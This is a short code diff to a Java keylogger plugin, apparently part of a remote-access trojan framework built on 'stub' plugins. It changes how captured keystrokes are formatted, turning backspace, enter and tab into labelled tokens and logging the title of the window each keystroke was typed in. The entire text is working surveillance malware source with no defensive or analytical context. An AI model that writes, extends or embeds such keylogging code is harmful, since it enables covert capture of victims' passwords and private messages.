@@ -174,7 +174,22 @@ public class KeyloggerPlugin extends StubPlugin {
 							if (a instanceof Title) {
 								out.println("\n\r[Window: " + a.toString() + "]");
 							} else if (a instanceof Key) {
-								out.print(((Key)a).getChar());
+								char ckey = ((Key)a).getChar();
+								String key;
+								
+								if (ckey == '\b') {
+									key = "[BACKSPACE]";
+								} else if (ckey == '\n' || ckey == '\r') {
+									key = "[ENTER]\n\r";
+								} else if (ckey == '\t') {
+									key = "[TAB]\t";
+								} else {
+									key = Character.toString(ckey);
+								}
+									
+								out.print(key);
+							} else {
+								throw new Exception("Not char or title");
 							}
 						}
 						
